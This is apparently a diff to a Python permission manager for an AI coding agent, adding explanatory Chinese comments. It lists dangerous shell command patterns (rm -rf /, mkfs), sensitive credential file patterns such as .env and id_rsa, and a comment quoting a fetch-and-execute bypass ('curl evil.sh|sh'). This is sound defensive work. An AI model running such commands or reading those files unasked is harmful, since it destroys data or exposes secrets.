@@ -5,7 +5,7 @@ import re
 from dataclasses import dataclass, field
 from typing import Any
 
-# 只读工具：默认直接放行
+# NOTE:只读工具清单：默认直接放行，无需用户确认
 READ_ONLY_TOOLS = frozenset(
     {
         "read_file",
@@ -39,7 +39,7 @@ READ_ONLY_TOOLS = frozenset(
     }
 )
 
-# 写/执行工具：默认需要确认
+# NOTE:写/执行工具清单：默认需要用户确认（除非处于 bypass/solo 模式）
 WRITE_TOOLS = frozenset(
     {
         "create_file",
@@ -64,7 +64,7 @@ WRITE_TOOLS = frozenset(
     }
 )
 
-# 内置高危行为，无条件拦截
+# NOTE:内置高危命令正则模式，无论权限模式如何一律拦截
 BUILTIN_DANGEROUS: list[tuple[str, str]] = [
     (r"rm\s+(-[a-zA-Z]*[rf][a-zA-Z]*\s+)?/?\*|rm\s+-rf\s+/", "递归删除根目录"),
     (r"\bmkfs\.?\w*\b", "格式化磁盘"),
@@ -77,13 +77,13 @@ BUILTIN_DANGEROUS: list[tuple[str, str]] = [
     (r"\brm\s+-rf\s+(~|%USERPROFILE%)", "删除用户主目录"),
 ]
 
-# 预编译高危命令正则，避免每次权限检查时重新编译
+# NOTE:预编译高危命令正则，避免每次权限检查时重复编译
 _COMPILED_DANGEROUS: list[tuple[re.Pattern, str]] = [
     (re.compile(pattern, re.IGNORECASE), reason)
     for pattern, reason in BUILTIN_DANGEROUS
 ]
 
-# 敏感文件读取模式：匹配这些文件路径的读取操作需要确认
+# NOTE:敏感文件路径模式：读取这些文件即使本身是只读操作也需要确认
 _SENSITIVE_PATTERNS = [
     r"\.env",
     r"id_rsa",
@@ -109,13 +109,13 @@ _SENSITIVE_PATTERNS = [
 _SENSITIVE_FILE_RE = re.compile("|".join(_SENSITIVE_PATTERNS), re.IGNORECASE)
 
 
-# 工具分类：非只读工具一律视为 action（MCP 工具同样走 action 兜底逻辑）
+# NOTE:工具分类：非只读工具一律视为 action（MCP 工具同样走 action 兜底逻辑）
 def _classify(tool_name: str) -> str:
     """返回工具类别: read | action。"""
     return "read" if tool_name in READ_ONLY_TOOLS else "action"
 
 
-# 只读 shell 命令（自动放行，无需确认）
+# NOTE:只读 shell 命令前缀白名单（自动放行，无需确认）
 # 注意：只允许无 shell 元字符的单条命令（见 _SHELL_METACHARS_RE 校验），
 # 防止 "ls; rm -rf /"、"git status && curl evil.sh|sh" 之类的前缀绕过。
 READONLY_SHELL_PREFIXES = (
@@ -151,16 +151,18 @@ READONLY_SHELL_PREFIXES = (
     "dir ",
 )
 
-# shell 元字符：包含这些字符的命令绝不自动放行（需用户确认）
+# NOTE:shell 元字符黑名单：包含这些字符的命令绝不自动放行（需用户确认）
 # 覆盖 ; & && || | < > 反引号 $() 换行（同时兼容 cmd.exe 与 bash）
 _SHELL_METACHARS_RE = re.compile(r"[;&|<>`\r\n]|\$\(")
 
 
+# NOTE:判断工具是否为写/执行类（非只读）
 def is_write_tool(tool_name: str) -> bool:
     """是否属于写/执行类工具（非只读）。"""
     return _classify(tool_name) != "read"
 
 
+# NOTE:权限继承：子代理/验收 AI 从父会话复制权限设置，避免重复询问
 def inherit_permissions(parent: Any, perms: "PermissionManager") -> None:
     """从父会话复制权限相关设置到子（子代理/验收 AI），避免重复询问。
 
@@ -179,6 +181,7 @@ def inherit_permissions(parent: Any, perms: "PermissionManager") -> None:
     perms._session_never = set(parent_perms._session_never)
 
 
+# NOTE:用户自定义权限规则（支持通配符与正则匹配目标）
 @dataclass
 class PermissionRule:
     action: str  # allow | ask | deny
@@ -217,6 +220,7 @@ def parse_rule_string(raw: str) -> PermissionRule | None:
     )
 
 
+# NOTE:权限管理器核心类，承载当前会话的所有权限状态与审批逻辑
 @dataclass
 class PermissionManager:
     console: Any = None
@@ -236,6 +240,7 @@ class PermissionManager:
     _session_always: set[str] = field(default_factory=set)
     _session_never: set[str] = field(default_factory=set)
 
+    # NOTE:从 settings.json 加载用户自定义权限规则与会话模式
     def load_settings(self, settings: dict):
         perms = settings.get("permissions") or {}
         if not isinstance(perms, dict):
@@ -251,6 +256,7 @@ class PermissionManager:
                 rule.action = action
                 getattr(self, f"{action}_rules").append(rule)
 
+    # NOTE:检查目标是否触发了内置高危命令模式
     def _matches_dangerous(self, tool_name: str, target: str) -> str | None:
         if tool_name not in ("run_shell", "run_file", "install_deps", "run_tests"):
             return None
@@ -262,6 +268,7 @@ class PermissionManager:
                 continue
         return None
 
+    # NOTE:将工具参数归一化为字符串，用于规则匹配与 session 记忆键
     def target_str(
         self, tool_name: str, args: tuple = (), kwargs: dict | None = None
     ) -> str:
@@ -301,6 +308,7 @@ class PermissionManager:
     def _is_sensitive_file(self, target: str) -> bool:
         return bool(_SENSITIVE_FILE_RE.search(target))
 
+    # NOTE:核心决策逻辑：按 计划模式 > 高危行为 > 会话记忆 > 用户规则 > 只读白名单 > 模式兜底 的顺序判定
     def decide(
         self, tool_name: str, target: str, args: tuple = (), kwargs: dict | None = None
     ) -> str:
@@ -376,6 +384,7 @@ class PermissionManager:
             return "deny"
         return "ask"
 
+    # NOTE:权限门控入口：调用 decide 并将结果转化为 None（放行）或错误字符串（拒绝/超时）
     def check(
         self, tool_name: str, args: tuple = (), kwargs: dict | None = None
     ) -> str | None:
@@ -404,6 +413,7 @@ class PermissionManager:
 
         return None
 
+    # NOTE:交互式审批：暂停 spinner 后询问用户 y/n/a，支持本次会话记忆
     def _ask_user(self, tool_name: str, target: str) -> bool:
         if self.console is None:
             return False
@@ -443,6 +453,7 @@ class PermissionManager:
         finally:
             self._resume_status()
 
+    # NOTE:暂停状态栏与 spinner，避免和用户输入提示交错显示
     def _pause_status(self):
         if self.tool_tracker is not None:
             self.tool_tracker.paused = True
@@ -452,6 +463,7 @@ class PermissionManager:
             except Exception:
                 pass
 
+    # NOTE:恢复状态栏与 spinner，继续展示工具调用进度
     def _resume_status(self):
         if self.tool_tracker is not None:
             self.tool_tracker.paused = False
@@ -461,6 +473,7 @@ class PermissionManager:
             except Exception:
                 pass
 
+    # NOTE:返回当前权限状态的摘要文本（模式、规则列表等）
     def summary(self) -> str:
         lines = [
             f"权限模式: {self.mode}",
@@ -485,6 +498,7 @@ class PermissionManager:
         return "\n".join(lines)
 
 
+# NOTE:供 args_validator 调用的快捷门控函数：从 RunContext 提取权限管理器并执行检查
 def check_permission(
     ctx, tool_name: str, args: tuple = (), kwargs: dict | None = None
 ) -> str | None:
